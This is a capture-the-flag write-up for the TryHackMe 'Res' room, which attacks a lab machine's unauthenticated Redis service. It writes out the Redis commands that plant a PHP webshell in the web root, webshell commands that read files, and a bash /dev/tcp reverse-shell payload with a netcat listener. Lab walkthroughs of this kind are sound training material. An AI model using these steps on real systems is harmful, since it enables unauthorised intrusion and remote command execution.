# Res

Room: [https://tryhackme.com/room/res](https://tryhackme.com/room/res)

---

# Reconnaissance

First, I used **RustScan** to identify all open ports on the target machine.

```bash
./rustscan -a 10.48.164.51 -r 1-65535
```

### Open Ports

```
22/tcp   open  ssh
80/tcp   open  http
6379/tcp open  redis
```

Total open ports: **3**

---

# Service Enumeration

Next, I used **Nmap** for detailed service detection.

```bash
nmap -sC -sV -T4 -p22,80,6379 10.48.164.51 -oN nmap.txt
```

### Results

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    Apache 2.4.41
6379/tcp open  redis   Redis key-value store 6.0.7
```

Database port: **6379**
Redis version: **6.0.7**

---

# Redis Enumeration

Since Redis was exposed, I attempted to connect:

```bash
redis-cli -h 10.48.164.51 -p 6379
```

Connection was successful **without authentication**, indicating a misconfiguration.

Running:

```bash
INFO
```

Found:

```
executable:/home/vianka/redis-stable/src/redis-server
```

This gave a valid system username:

```
vianka
```

---

# Exploitation

Redis allows:

* Writing arbitrary data
* Controlling file location
* Controlling filename

Since Apache is running, I wrote a **PHP webshell** into the web root.

```bash
CONFIG SET dir /var/www/html
set shell "<?php system($_GET['cmd']); ?>"
CONFIG SET dbfilename shell.php
save
```

---

# Webshell Access

Accessing:

```
http://10.48.164.51/shell.php?cmd=id
```

Returned:

```
uid=33(www-data) gid=33(www-data)
```

Webshell successfully working

---

# User Flag

Using the webshell for enumeration:

```
?cmd=ls /home
```

Found:

```
vianka
```

Then:

```
?cmd=cat /home/vianka/user.txt
```


---

# Reverse Shell

To get a more stable shell:

### Listener

```bash
nc -lvnp 4444
```

### Payload (URL encoded)

```
?cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```
Got the Reverse shell.

---

# Privilege Escalation

After getting shell access, I performed enumeration:

```bash
sudo -l
find / -type f -perm -4000 2>/dev/null
```

I also ran **LinPEAS**, which showed that the system might be vulnerable to **DirtyPipe**, but attempts to exploit it were unsuccessful.

I then identified a potential SUID binary after reading some writeups

```
/usr/bin/xxd
```

However, attempts to exploit it resulted in **permission denied errors**, and it did not lead to privilege escalation in my case.

Although `/usr/bin/xxd` appeared to be a possible privilege escalation vector, it did not work in this environment. After multiple attempts and further research, I referred to other writeups and used the known password for user **vianka** to proceed.
